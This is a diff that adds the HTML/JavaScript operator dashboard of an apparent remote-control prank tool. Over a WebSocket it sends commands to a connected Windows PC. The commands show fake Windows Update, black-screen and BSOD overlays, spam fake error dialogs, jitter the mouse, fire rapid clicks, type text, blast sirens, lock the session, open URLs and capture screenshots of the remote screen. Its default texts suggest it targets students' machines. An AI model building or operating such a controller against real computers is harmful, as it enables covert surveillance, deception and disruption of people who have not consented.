@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PC Control Panel</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #070B0F;
+    --bg2: #0D1318;
+    --bg3: #131A22;
+    --border: #1E2D3D;
+    --accent: #00D4FF;
+    --accent2: #FF3B6B;
+    --accent3: #39FF7A;
+    --text: #C8D8E8;
+    --muted: #4A6070;
+    --danger: #FF3B6B;
+    --safe: #39FF7A;
+    --warn: #FFB800;
+    --card-h: 1px solid var(--accent);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.015) 2px, rgba(0,212,255,0.015) 4px);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .scanline {
+    position: fixed;
+    top: -100%;
+    left: 0;
+    width: 100%;
+    height: 40px;
+    background: linear-gradient(transparent, rgba(0,212,255,0.04), transparent);
+    animation: scan 8s linear infinite;
+    pointer-events: none;
+    z-index: 1;
+  }
+  @keyframes scan { to { top: 120%; } }
+
+  header {
+    position: relative;
+    z-index: 10;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 24px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(13,19,24,0.95);
+    backdrop-filter: blur(8px);
+  }
+  .logo {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 18px;
+    color: var(--accent);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+  .logo span { color: var(--muted); }
+
+  .status-dot {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+  }
+  .dot {
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: var(--danger);
+    box-shadow: 0 0 8px var(--danger);
+    transition: all 0.4s;
+  }
+  .dot.on {
+    background: var(--safe);
+    box-shadow: 0 0 10px var(--safe);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { box-shadow: 0 0 8px var(--safe); }
+    50% { box-shadow: 0 0 18px var(--safe), 0 0 30px var(--safe); }
+  }
+
+  .main {
+    position: relative;
+    z-index: 5;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 20px 16px 40px;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 14px;
+  }
+
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    border-radius: 6px 6px 0 0;
+  }
+  .card.danger::before { background: var(--danger); box-shadow: 0 0 12px var(--danger); }
+  .card.safe::before { background: var(--safe); box-shadow: 0 0 12px var(--safe); }
+  .card.warn::before { background: var(--warn); box-shadow: 0 0 12px var(--warn); }
+  .card.info::before { background: var(--accent); box-shadow: 0 0 12px var(--accent); }
+  .card:hover { border-color: rgba(0,212,255,0.3); }
+
+  .card-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-title.danger { color: var(--danger); }
+  .card-title.safe { color: var(--safe); }
+  .card-title.warn { color: var(--warn); }
+  .card-title.info { color: var(--accent); }
+
+  .icon {
+    font-size: 16px;
+    line-height: 1;
+  }
+
+  .btn-row {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  button {
+    font-family: 'Rajdhani', sans-serif;
+    font-weight: 600;
+    font-size: 14px;
+    padding: 8px 16px;
+    border-radius: 4px;
+    border: 1px solid;
+    cursor: pointer;
+    letter-spacing: 0.5px;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  button:active { transform: scale(0.96); }
+
+  .btn-danger {
+    background: rgba(255,59,107,0.12);
+    border-color: var(--danger);
+    color: var(--danger);
+  }
+  .btn-danger:hover { background: rgba(255,59,107,0.25); box-shadow: 0 0 12px rgba(255,59,107,0.3); }
+
+  .btn-safe {
+    background: rgba(57,255,122,0.1);
+    border-color: var(--safe);
+    color: var(--safe);
+  }
+  .btn-safe:hover { background: rgba(57,255,122,0.22); box-shadow: 0 0 12px rgba(57,255,122,0.3); }
+
+  .btn-warn {
+    background: rgba(255,184,0,0.1);
+    border-color: var(--warn);
+    color: var(--warn);
+  }
+  .btn-warn:hover { background: rgba(255,184,0,0.22); }
+
+  .btn-info {
+    background: rgba(0,212,255,0.1);
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+  .btn-info:hover { background: rgba(0,212,255,0.22); box-shadow: 0 0 12px rgba(0,212,255,0.3); }
+
+  .btn-ghost {
+    background: transparent;
+    border-color: var(--muted);
+    color: var(--muted);
+  }
+  .btn-ghost:hover { border-color: var(--text); color: var(--text); }
+
+  .btn-block { width: 100%; justify-content: center; display: flex; }
+
+  input[type=text], input[type=number], input[type=url], textarea, select {
+    width: 100%;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    padding: 8px 10px;
+    outline: none;
+    transition: border-color 0.2s;
+    margin-bottom: 8px;
+  }
+  input:focus, textarea:focus, select:focus { border-color: var(--accent); }
+  textarea { resize: vertical; min-height: 56px; }
+
+  input[type=range] {
+    width: 100%;
+    accent-color: var(--accent);
+    margin-bottom: 6px;
+  }
+
+  .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .row3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+
+  label {
+    font-size: 12px;
+    color: var(--muted);
+    margin-bottom: 4px;
+    display: block;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  .val-display {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--accent);
+    text-align: right;
+    margin-bottom: 8px;
+  }
+
+  /* Log panel */
+  .log-panel {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 12px 14px;
+    margin-bottom: 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    max-height: 120px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column-reverse;
+  }
+  .log-entry {
+    padding: 2px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    animation: fadeIn 0.2s;
+  }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }
+  .log-entry.ok { color: var(--safe); }
+  .log-entry.err { color: var(--danger); }
+  .log-entry.warn { color: var(--warn); }
+  .log-entry.info { color: var(--accent); }
+  .log-entry.sys { color: var(--muted); }
+
+  /* Screenshot */
+  #screenshot-box {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    min-height: 100px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--muted);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    margin-top: 10px;
+  }
+  #screenshot-box img { width: 100%; display: block; }
+
+  /* Big alert */
+  .nuke-btn {
+    width: 100%;
+    padding: 14px;
+    font-size: 16px;
+    letter-spacing: 2px;
+    background: rgba(255,59,107,0.15);
+    border: 1px solid var(--danger);
+    color: var(--danger);
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: 'Share Tech Mono', monospace;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    margin-top: 10px;
+  }
+  .nuke-btn:hover {
+    background: rgba(255,59,107,0.3);
+    box-shadow: 0 0 20px rgba(255,59,107,0.4);
+  }
+
+  .tag {
+    font-size: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    padding: 2px 6px;
+    border-radius: 3px;
+    letter-spacing: 1px;
+  }
+  .tag.new { background: rgba(255,184,0,0.15); color: var(--warn); border: 1px solid var(--warn); }
+
+  /* Separator */
+  .sep { height: 1px; background: var(--border); margin: 12px 0; }
+
+  .section-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin: 20px 0 10px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+
+<header>
+  <div class="logo">PC<span>/</span>CTRL</div>
+  <div class="status-dot">
+    <div class="dot" id="statusDot"></div>
+    <span id="statusText" style="color:var(--muted)">OFFLINE</span>
+  </div>
+</header>
+
+<div class="main">
+  <!-- Log -->
+  <div class="section-title">Лог событий</div>
+  <div class="log-panel" id="log"></div>
+
+  <!-- ЭКСТРЕННО -->
+  <div class="section-title">Экстренные действия</div>
+  <div class="grid">
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">🚫</span> Закрыть всё</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Убирает все активные оверлеи (обновление, чёрный экран, BSOD, матрица)</p>
+      <button class="btn-danger btn-block" onclick="send({cmd:'close_all'})">⬛ CLOSE ALL</button>
+    </div>
+
+    <div class="card info">
+      <div class="card-title info"><span class="icon">📸</span> Скриншот</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:10px;">Сделать снимок экрана ПК прямо сейчас</p>
+      <button class="btn-info btn-block" onclick="send({cmd:'screenshot'})">📷 СДЕЛАТЬ СКРИНШОТ</button>
+      <div id="screenshot-box">нет снимка</div>
+    </div>
+  </div>
+
+  <!-- ЭКРАНЫ -->
+  <div class="section-title">Оверлеи / Экраны</div>
+  <div class="grid">
+
+    <div class="card warn">
+      <div class="card-title warn"><span class="icon">💿</span> Фейковое обновление Windows</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Полноэкранный экран "Windows Update" с анимацией прогресса. Мышь всё ещё работает.</p>
+      <div class="btn-row">
+        <button class="btn-warn" onclick="send({cmd:'fake_update'})">▶ ВКЛЮЧИТЬ</button>
+        <button class="btn-ghost" onclick="send({cmd:'close_update'})">■ ВЫКЛЮЧИТЬ</button>
+      </div>
+    </div>
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">⬛</span> Чёрный экран</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Накрывает весь экран чёрным. Кажется что монитор сломался.</p>
+      <div class="btn-row">
+        <button class="btn-danger" onclick="send({cmd:'black_screen'})">▶ ВКЛЮЧИТЬ</button>
+        <button class="btn-ghost" onclick="send({cmd:'close_black'})">■ ВЫКЛЮЧИТЬ</button>
+      </div>
+    </div>
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">💀</span> BSOD <span class="tag new">NEW</span></div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Фейковый синий экран смерти Windows с рандомным стоп-кодом.</p>
+      <div class="btn-row">
+        <button class="btn-danger" onclick="send({cmd:'bsod'})">▶ ВКЛЮЧИТЬ</button>
+        <button class="btn-ghost" onclick="send({cmd:'close_bsod'})">■ ВЫКЛЮЧИТЬ</button>
+      </div>
+    </div>
+
+    <div class="card safe">
+      <div class="card-title safe"><span class="icon">🟢</span> Матрица <span class="tag new">NEW</span></div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Дождь из символов как в "Матрице" на весь экран.</p>
+      <div class="btn-row">
+        <button class="btn-safe" onclick="send({cmd:'matrix'})">▶ ВКЛЮЧИТЬ</button>
+        <button class="btn-ghost" onclick="send({cmd:'close_matrix'})">■ ВЫКЛЮЧИТЬ</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ДИАЛОГИ -->
+  <div class="section-title">Диалоговые окна</div>
+  <div class="grid">
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">⚠️</span> Фейковая ошибка</div>
+      <label>Заголовок окна</label>
+      <input type="text" id="errTitle" value="Сообщение от Олег Владимирович" placeholder="Заголовок">
+      <label>Текст ошибки</label>
+      <textarea id="errMsg" rows="2">Ребятки не балуйтесь</textarea>
+      <label>Кол-во окон (спам)</label>
+      <div class="row2">
+        <input type="number" id="errCount" value="1" min="1" max="10">
+        <button class="btn-danger" onclick="sendError()">⚠ ПОКАЗАТЬ</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- УПРАВЛЕНИЕ -->
+  <div class="section-title">Управление мышью и клавиатурой</div>
+  <div class="grid">
+
+    <div class="card warn">
+      <div class="card-title warn"><span class="icon">🖱️</span> Лаги мышки</div>
+      <label>Длительность (сек) — <span id="jitterSecVal">5</span></label>
+      <input type="range" min="2" max="30" value="5" id="jitterSec"
+             oninput="document.getElementById('jitterSecVal').textContent=this.value">
+      <label>Интенсивность — <span id="jitterIntVal">80</span>px</label>
+      <input type="range" min="10" max="200" value="80" id="jitterInt"
+             oninput="document.getElementById('jitterIntVal').textContent=this.value">
+      <button class="btn-warn btn-block" onclick="sendJitter()">🖱 ДЁРГАТЬ МЫШЬ</button>
+    </div>
+
+    <div class="card info">
+      <div class="card-title info"><span class="icon">⌨️</span> Напечатать текст</div>
+      <label>Откроет Блокнот и напечатает текст</label>
+      <textarea id="typeText" rows="3" placeholder="Введи текст для печати на ПК…">Привет! Это твой компьютер, у меня для тебя сообщение</textarea>
+      <button class="btn-info btn-block" onclick="sendType()">⌨ ПЕЧАТАТЬ</button>
+    </div>
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">🖱️</span> Быстрые клики</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">15 автоматических кликов подряд — ужас если что-то открыто.</p>
+      <button class="btn-danger btn-block" onclick="send({cmd:'rapid_click'})">💥 СПАМ КЛИКОВ</button>
+    </div>
+
+  </div>
+
+  <!-- ЗВУК И СИСТЕМА -->
+  <div class="section-title">Звук и система</div>
+  <div class="grid">
+
+    <div class="card warn">
+      <div class="card-title warn"><span class="icon">🔊</span> Громкость</div>
+      <label>Уровень — <span id="volVal">50</span>%</label>
+      <input type="range" min="0" max="100" value="50" id="volRange"
+             oninput="document.getElementById('volVal').textContent=this.value">
+      <div class="row3" style="margin-top:8px;">
+        <button class="btn-ghost" onclick="send({cmd:'volume',level:0})">🔇 0%</button>
+        <button class="btn-warn" onclick="sendVol()">✔ SET</button>
+        <button class="btn-danger" onclick="send({cmd:'volume',level:100})">📢 100%</button>
+      </div>
+    </div>
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">🔔</span> Звуковые атаки</div>
+      <div class="btn-row" style="flex-direction:column;">
+        <button class="btn-warn" onclick="send({cmd:'beep'})">🔔 НАЗОЙЛИВЫЙ БИПСИГНАЛ</button>
+        <button class="btn-danger" style="margin-top:6px;" onclick="send({cmd:'siren'})">🚨 СИРЕНА</button>
+      </div>
+    </div>
+
+    <div class="card danger">
+      <div class="card-title danger"><span class="icon">🔒</span> Блокировка</div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Мгновенно блокирует Windows-сессию.</p>
+      <button class="btn-danger btn-block" onclick="if(confirm('Заблокировать экран?')) send({cmd:'lock_screen'})">🔒 ЗАБЛОКИРОВАТЬ</button>
+    </div>
+
+    <div class="card info">
+      <div class="card-title info"><span class="icon">🌐</span> Открыть ссылку</div>
+      <label>URL (откроется в браузере ПК)</label>
+      <input type="url" id="urlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ" placeholder="https://...">
+      <button class="btn-info btn-block" onclick="sendUrl()">🌐 ОТКРЫТЬ</button>
+    </div>
+
+  </div>
+
+  <!-- ЭКСТРА -->
+  <div class="section-title">Прочее</div>
+  <div class="grid">
+    <div class="card warn">
+      <div class="card-title warn"><span class="icon">🔄</span> Перевернуть экран <span class="tag new">NEW</span></div>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:12px;">Меняет ориентацию дисплея на 90° (требует win32api на клиенте).</p>
+      <button class="btn-warn btn-block" onclick="send({cmd:'flip_screen'})">🔄 ПОВЕРНУТЬ</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const WS_URL = `ws://${location.host}/ws/dashboard`;
+  let ws = null;
+  let connected = false;
+
+  function log(msg, type='info') {
+    const panel = document.getElementById('log');
+    const el = document.createElement('div');
+    el.className = `log-entry ${type}`;
+    const t = new Date().toLocaleTimeString('ru', {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+    el.textContent = `[${t}] ${msg}`;
+    panel.prepend(el);
+    while (panel.children.length > 60) panel.lastChild.remove();
+  }
+
+  function setStatus(on, text) {
+    connected = on;
+    document.getElementById('statusDot').className = 'dot' + (on ? ' on' : '');
+    document.getElementById('statusText').textContent = text;
+    document.getElementById('statusText').style.color = on ? 'var(--safe)' : 'var(--danger)';
+  }
+
+  function connect() {
+    ws = new WebSocket(WS_URL);
+
+    ws.onopen = () => {
+      log('Подключён к серверу', 'ok');
+      setStatus(false, 'СЕРВЕР ОК • ПК ОЖИДАЕТ');
+    };
+
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+
+      if (msg.type === 'status') {
+        setStatus(msg.pc_connected, msg.pc_connected ? `ONLINE — ${msg.pc_count} PC` : 'PC OFFLINE');
+        if (msg.message) log(msg.message, msg.pc_connected ? 'ok' : 'warn');
+      }
+      else if (msg.type === 'response') {
+        if (msg.status === 'ok') log(`✓ ${msg.cmd} — выполнено`, 'ok');
+        else log(`✗ ${msg.cmd}: ${msg.message}`, 'err');
+      }
+      else if (msg.type === 'screenshot') {
+        const box = document.getElementById('screenshot-box');
+        box.innerHTML = `<img src="data:image/jpeg;base64,${msg.data}" alt="screenshot">`;
+        log('Скриншот получен', 'ok');
+      }
+      else if (msg.type === 'error') {
+        log(msg.message, 'err');
+      }
+    };
+
+    ws.onerror = () => log('Ошибка соединения', 'err');
+
+    ws.onclose = () => {
+      setStatus(false, 'ПЕРЕПОДКЛЮЧЕНИЕ…');
+      log('Соединение потеряно, переподключение…', 'warn');
+      setTimeout(connect, 3000);
+    };
+  }
+
+  function send(data) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+      log('Нет соединения с сервером', 'err');
+      return;
+    }
+    if (!connected) {
+      log('PC не подключён', 'err');
+      return;
+    }
+    ws.send(JSON.stringify(data));
+    log(`→ ${data.cmd}`, 'sys');
+  }
+
+  function sendError() {
+    send({
+      cmd: 'fake_error',
+      title: document.getElementById('errTitle').value || 'Ошибка',
+      message: document.getElementById('errMsg').value || '!',
+      spam: parseInt(document.getElementById('errCount').value) || 1
+    });
+  }
+
+  function sendJitter() {
+    send({
+      cmd: 'mouse_jitter',
+      seconds: parseInt(document.getElementById('jitterSec').value),
+      intensity: parseInt(document.getElementById('jitterInt').value)
+    });
+  }
+
+  function sendType() {
+    const text = document.getElementById('typeText').value;
+    if (!text.trim()) return;
+    send({ cmd: 'type_text', text });
+  }
+
+  function sendUrl() {
+    const url = document.getElementById('urlInput').value;
+    if (!url.trim()) return;
+    send({ cmd: 'open_url', url });
+  }
+
+  function sendVol() {
+    send({ cmd: 'volume', level: parseInt(document.getElementById('volRange').value) });
+  }
+
+  connect();
+</script>
+</body>
+</html>
